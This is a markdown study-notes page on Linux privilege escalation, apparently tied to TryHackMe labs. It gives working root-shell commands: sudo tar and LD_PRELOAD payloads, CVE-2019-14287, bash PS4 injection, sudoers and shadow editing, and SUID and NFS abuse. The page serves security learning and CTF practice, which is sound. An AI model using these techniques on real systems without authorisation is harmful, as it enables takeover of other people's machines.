# Compromise a Linux host

[![linuxfundamentalspart1](../../_badges/thm/linuxfundamentalspart1.svg)](https://tryhackme.com/room/linuxfundamentalspart1)
[![linuxfundamentalspart2](../../_badges/thm/linuxfundamentalspart2.svg)](https://tryhackme.com/room/linuxfundamentalspart2)
[![linuxfundamentalspart3](../../_badges/thm/linuxfundamentalspart3.svg)](https://tryhackme.com/room/linuxfundamentalspart3)
[![linux1](../../_badges/thm/linux1.svg)](https://tryhackme.com/room/linux1)
[![linux2](../../_badges/thm/linux2.svg)](https://tryhackme.com/room/linux2)
[![bashscripting](../../_badges/thm/bashscripting.svg)](https://tryhackme.com/room/bashscripting)
[![linuxstrengthtraining](../../_badges/thm/linuxstrengthtraining.svg)](https://tryhackme.com/room/linuxstrengthtraining)
[![catregex](../../_badges/thm/catregex.svg)](https://tryhackme.com/room/catregex)
[![linuxprivesc](../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
[![commonlinuxprivesc](../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
[![linprivesc](../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
[![linux_privilege_escalation](../../_badges/poat/linux_privilege_escalation.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

<div class="row row-cols-md-2"><div>

As there isn't much we can do as a regular user, we will try to elevate our level of privileges to root (administrator). You may have to do horizontal escalation first, i.g. moving to another account that has the same level of privilege, but may have different permissions.

* Find misconfiguration <small>(sudo, system files, NFS...)</small>
* Find a vulnerable service and exploit it <small>(apache, mysql...)</small>
* Find processes/tasks/scripts in which you can inject data
  * Cron tasks/jobs
  * executables with the SUID bit
  * ...
* Find a vulnerability in the kernel
* ...

The **goal is to pop out a shell as root** (root shell), basically, the same as if the administrator used `sudo -s`.

</div><div>

There are many **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...

* [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) (10.4k ⭐): enumerate host | script shell
* [LinEnum](https://github.com/rebootuser/LinEnum) (5.4k ⭐): enumerate host | script shell
* [traitor](https://github.com/liamg/traitor)  (5.4k ⭐): enumerate/exploit host | script in go
* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (lse, 2.5k ⭐): enumerate host | script shell
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (1.1k ⭐): enumerate host | python script
* [pwncat-cs](https://github.com/calebstewart/pwncat) (1.8k ⭐): enumerate/exploit host | script in Python
</div></div>

<hr class="sep-both">

## 🎁 GTFOBins 🎁

<div class="row row-cols-md-2"><div>

It's common for well-known Linux commands to be misconfigured. Vulnerabilities can lead to reading/writing root-only files, executing commands as root...

**[gtfobins](https://gtfobins.github.io/)** (7.4k ⭐) is the reference when looking for commands to exploit misconfigured Linux commands.

> There is a local version of [gtfo in Python](https://github.com/t0thkr1s/gtfo) (96 ⭐, 2021).
</div><div>

Example: you can only run `tar` using `sudo`. Run the command below from [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo), and you will get a root shell.

```bash
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

> I'm adding [some extras here](gtfobins.md). Two small notes
> 
> * `/bin/bash -i`: start an interactive bash
> * `/bin/bash -p`: do not drop privilege <small>(SUID, start the bash as root)</small>
</div></div>

<hr class="sep-both">

## Learn more about your environment

Aside from commands that are in the Linux notes, here are a few used in cybersecurity.

<div class="row row-cols-md-2"><div>

* `w`: who is logged in, and what they are doing
* `who`: who is logged in
* `echo $0`: language used by the current shell
* `whoami`: username
* `last`: list of last logged users
* `id`: username, group...
* `groups`: list groups
* `uname -a`: info about the kernel
* `hostname`: info about the host <small>(ex: `website-dev` -> role of the user)</small>
* `ps -e` / `top`: see running process
* `env`: see environment variables
* `umask`: see the default perms on newly created files
* `finger`: return a summary of information about a user
* `find / -writable -type d 2>/dev/null`: find writable directories

**Potentially vulnerable services** 💸

* Apache: `apache2 -v` / `apache2ctl -M`
* Sudo: `sudo -V`
* PostgresSQL: `psql -V`
* MySQL: `mysql --version`
</div><div>

System Files 🔏

* `/proc/version`: information about the machine
* `/etc/*release`: information about the operating system
* `/etc/issue`: an alternative to find the OS/version
* `/etc/passwd`: usernames, their groups, their home, and their shell
* `/etc/shadow` <small>(root)</small>: username, and their hashed password
* `/etc/sudoers` <small>(root)</small>: sudoers, and rules applied to them, if any

User files 🍃

* `ls -ahl /root/`: see if there are readable files in root's home
* `ls /`: look for unexpected folders in `/`
* `find / -name *id_dsa* 2> /dev/null`: RSA credentials
* `~/.bash_history`: password (sudo/mysql...)
* Look for backups <small>(.bak, .old...)</small>

Others 🔎

* Look for mails `/var/mail/`
* Look for logs `/var/log/`
  * Look for firewall logs (`/var/log/syslog`)
  * Look for apache/... logs
  * Look for fail2ban logs
  * Look for ssh logs (`/var/log/auth.log`)
* `/etc/services`: see ports and the services running on it
* `/etc/profile`: set environment variables...

</div></div>

> **NOTE**: don't forget to redirect any errors with `some_command 2> /dev/null`.

<hr class="sep-both">

## Exploit sudo

*A good reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)* (1.6k ⭐).

<div class="row row-cols-md-2"><div>

[![picklerick](../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)
[![linprivesc](../../_badges/thm-p/linprivesc.svg)](https://tryhackme.com/room/linprivesc#task-12)

Try to find commands that can be run with sudo

```bash
$ sudo -nl # test if you can sudo without a password
$ sudo -l # if you can't, try with your password
# -> in both cases, if you were successful
# and there are some interesting stuff such as:
Matching Defaults entries for [...]:
    [...] # vulnerable env variables? (LD_PRELOAD...)

User [...] may run the following commands on [...]:
    (root) /bin/tar # see tar#sudo on GTFOBins
```

It's possible for the administrator to only allow a command/multiple commands to be run as root by a user. This is the case with `tar` above. If you can see `ALL`, then you can run any command as root.
</div><div>

With LD_PRELOAD ([see explanation](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)) and env_keep option set, you can create a root shell by compiling the following code with `gcc -shared -fPIC init.c -o init.so`

```c
void _init() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# running this will create a root shell
$ LD_PRELOAD=/tmp/init.so tar
```

**sudo before 1.8.28 (CVE-2019-14287)**

[![agentsudoctf](../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)

If a user was allowed to run one specific command using sudo, such as `tar`, then it was possible for any other user to impersonate the authorized user, and run the command as root too.

```bash
$ sudo -u#-1 tar [...]
$ sudo -u#4294967295 tar [...]
```
</div></div>

<hr class="sep-both">

## Environment

<div class="row row-cols-md-2"><div>

In a lot of cases (SUID/GUID, sudo, capabilities...), you may have to use the trick of editing the environment. In all the cases listed, a **regular user** is allowed to run an executable/command/script **as root**.

There are basic scenarios in which you can directly exploit the executable, but in other scenarios, you may have to exploit the environment, meaning

* edit the environment variables
* edit the files used by the program
* create a file named after the options of the command, so that when a vulnerable glob-pattern is replaced, you will actually inject options
* ...

For instance, if a script uses the command `ls` and the environment variable `PATH` with the value `/tmp:[...]`, then because you can write in `/tmp`, you can create an executable named `ls` which is actually a `bash`. When the script run as root is executed, the command bash is executed as root, and your escalation is done. If you are the one running the script, you can also change your own PATH.
</div><div>

**Bash versions <4.2-048**: it is possible to create functions named after a path, which allows us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.

```bash
function /some/path { /bin/bash -p; }
export -f /some/path
```

**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.

```bash
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
```
</div></div>

<hr class="sep-both">

## Misconfigured files

<div class="row row-cols-md-2"><div>

If `/etc/passwd` was <s>intentionally</s> misconfigured

```bash
$ cat /etc/passwd
# if you can read it: try to brute force the password
# if you can write it: change the root password
# (copy a password / generate one mkpasswd -m sha-512 toto)
```

If `/etc/shadow` was <s>intentionally</s> misconfigured

```bash
$ cat /etc/shadow
# if you can write it: make your user part of root group
# if you can write it: add a new user that is part of root group
# (copy a password / generate one mkpasswd -m sha-512 toto)
```
</div><div>

If `/etc/sudoers` was <s>intentionally</s> misconfigured

```bash
$ cat /etc/sudoers
# if you can read it: find users that will be useful to compromise
# if you can write it: add yourself in
# your_user    ALL=(ALL:ALL) ALL
```

Until 1979/Unix V7, passwords were stored in `/etc/passwd`, so a regular user could read them, and try brute-forcing the password.

```bash
$ cat /etc/shadow
- root:x:...
+ root:hashed_password:...
# openssl passwd toto
```
</div></div>

<hr class="sep-both">

## SUID/GUID bit

[![vulnversity](../../_badges/thm-p/vulnversity.svg)](https://tryhackme.com/room/vulnversity)
[![kenobi](../../_badges/thm-p/kenobi.svg)](https://tryhackme.com/room/kenobi)
[![rrootme](../../_badges/thm-p/rrootme.svg)](https://tryhackme.com/room/rrootme)
[![linprivesc](../../_badges/thm-p/linprivesc.svg)](https://tryhackme.com/room/linprivesc#task-12)
[![cowboyhacker](../../_badges/thm-p/cowboyhacker.svg)](https://tryhackme.com/room/cowboyhacker)

<div class="row row-cols-md-2"><div>

Scripts having the SUID bit can be executed with the permissions of their owner. GUID is the same as the SUID, but with group owner permissions. If you find interesting files, check them out on GTFOBins.

```bash
# "-04000" "-4000" | "-4001"
$ find / -perm -u=s -type f -ls 2>/dev/null
# and group
$ find / -perm -g=s -type f -ls 2>/dev/null
```

> **CVE-2021-4034**: `/usr/bin/pkexec` a file installed by default on every major Linux distribution with a **SUID bit** could be exploited to get root. See [arthepsy PoC](https://github.com/arthepsy/CVE-2021-4034) (0.9k ⭐), or [berdav PoC](https://github.com/berdav/CVE-2021-4034) (1.7k ⭐).
</div><div>

If the script **hand-made**, or **not on GTFOBins**, then you can use the commands below to hopefully find which files and environment variables the script is using

* `strace script`: see every system call
* `strings script`: extract every readable string, may not be installed

You may be able to make the script do what you want by editing environment variables or files that it uses.
</div></div>

<hr class="sep-both">

## Capabilities

<div class="row row-cols-md-2"><div>

Capabilities are a level below SUID/GUID permissions. It's possible for an administrator to allow an executable to use some "features" that usually would require root privileges <small>(ex: creating sockets, creating raw TCP packets...)</small>.

Find executables with capabilities

```bash
$ getcap -r / 2>/dev/null
```
</div><div>

Then, 

* Look for the executable on [GTFOBins](https://gtfobins.github.io/#+capabilities)
* Use the same techniques that for SUID/GUID files not on GTFOBins
</div></div>

<hr class="sep-both">

## Network File System (NFS)

[![kenobi](../../_badges/thm-p/kenobi.svg)](https://tryhackme.com/room/kenobi)

<div class="row row-cols-md-2"><div>

To avoid copying and pasting information too much, you will have to read these pages for more information.

* [NFS protocol](/_it/networking/protocols/index.md#-nfs---2049-tcp)
* [NFS notes](/_cybersecurity/exploitation/services/index.md#nfs---2049-tcp)

To summarize, locally, you can use this command to find NFS shares.

```bash
# see NFS exports
$ cat /etc/exports
```
</div><div>

You will find an exploitable NFS misconfiguration when the option `no_root_squash` is set for a share. Root squashing map any local user to the user "nobody". If disabled, then the root user on the local machine will have root privilege inside the share.

```bash
# on the remote host, we create a bash inside the share
$ cp /bin/bash /share/sbash
# on the local host
# we give the file root privileges
$ sudo chown root /tmp/share/sbash
$ sudo chmod +s /tmp/share/sbash
# Then on the host, running the SUID file
# will run it as root
$ /share/sbash -p
```
</div></div>

<hr class="sep-both">

## Cron tasks/jobs

[![startup](../../_badges/thm-p/startup.svg)](https://tryhackme.com/room/startup)

<div class="row row-cols-md-2"><div>

Cron is the name given to automated tasks on Linux.

```bash
# tasks of the current user
$ crontab -l
# list every system-wide cron task
$ ls -la /etc/cron*
```

⚠️ It's worth noting that system-wide cron tasks and user-created cron tasks are not stored in the same place. Only root can browse/list other users' cron tasks.

```bash
# tasks of the user 'root'
$ sudo ls /var/spool/cron/crontabs/root
# tasks of the user 'root'
$ sudo crontab -l -u root
```
</div><div>

But, there is another way to find users' cron tasks. You can monitor Linux processes, for instance, using [pspy](https://github.com/DominicBreuker/pspy) (3.2k ⭐) which can monitor Linux processes without root permissions.

```bash
$ # use wget/... to fetch the static binary
$ chmod +x /tmp/pspy
$ /tmp/pspy
```

> **CTF**: they're usually running every minute or every 5 minutes.
</div></div>

<hr class="sep-both">

## Kernel exploits

<div class="row row-cols-md-2"><div>

Kernel exploits should be used as the last resort, as they will most probably severely impact the machine state/crash the machine if they fail. You can find the complete list of CVEs for the Linux Kernel [here](https://www.linuxkernelcves.com/cves).

* [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW) on Linux kernel <4.8.3
</div><div>

There are scripts, but remember that they may generate false positives or false negatives.

* [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) (3.9k ⭐): still updated with new exploits
* [Linux_Exploit_Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester) (1.6k ⭐): up to 4.x excluded
* [Linux Kernel Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) (1.4k ⭐): up to 5.x excluded
</div></div>

<hr class="sep-both">

## Random

<div class="row row-cols-md-2"><div>

The Fork bomb is an attack wherein a process continually replicates itself to deplete available system resources, according to [Wikipedia](https://en.wikipedia.org/wiki/Fork_bomb).
</div><div>
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-md-2"><div>

Courses

* [payatu.com](https://payatu.com/guide-linux-privilege-escalation)
* [udemy.com](https://www.udemy.com/course/linux-privilege-escalation/)
</div><div>
</div></div>